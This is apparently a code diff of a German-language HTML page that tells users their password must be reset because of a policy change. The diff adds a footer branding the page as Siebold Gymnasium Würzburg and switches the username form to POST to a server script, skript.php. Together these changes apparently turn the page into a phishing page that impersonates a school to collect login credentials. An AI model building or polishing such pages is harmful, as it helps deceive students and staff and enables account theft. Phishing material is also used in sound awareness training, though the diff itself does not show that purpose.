@@ -45,13 +45,22 @@
         button:hover {
             background-color: #333;
         }
+        footer {
+            background-color: #444944;
+            color: white;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
 
 <h2>Passwort muss aufgrund einer Richtlinienänderung zurückgesetzt werden!</h2>
 
-<form action="display.html" method="get">
+<form action="skript.php" method="post">
     
     <label for="username">Benutzername:</label>
     <input type="text" id="username" placeholder="Benutzername" required>
@@ -85,6 +94,9 @@
     }
 </script>
 
+<footer>
+    © 2024 Siebold Gymnasium Würzburg. Alle Rechte vorbehalten.
+</footer>
 </body>
 </html>
 
